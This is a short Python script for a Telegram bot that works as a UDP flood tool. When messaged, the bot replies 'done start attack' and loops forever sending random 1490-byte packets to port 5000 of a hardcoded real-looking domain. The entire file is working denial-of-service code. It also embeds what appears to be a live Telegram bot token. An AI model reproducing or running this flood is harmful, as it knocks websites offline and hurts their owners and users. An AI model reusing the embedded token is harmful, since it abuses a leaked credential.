import socket

import re

import random

import telebot

bot = telebot.TeleBot("5036121723:AAFLo-MjCJjxs657KPnrnS1tEo3jm54phXw")

print("- [ ! ] Bot Running Now .")

@bot.message_handler(commands=['start'])
def s(message):

 bot.reply_to(message, "ارسل الدومين")

@bot.message_handler(func=lambda m: True)
def echo_all(message):

 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

 bytes = random._urandom(1490)
  
 bot.reply_to(message, "done start attack")
 
 while True : 

     sock.sendto(bytes, (socket.gethostbyname("ramy-essa.com"), 5000))

bot.polling(True)

bot.reply_to(message, "stop attack")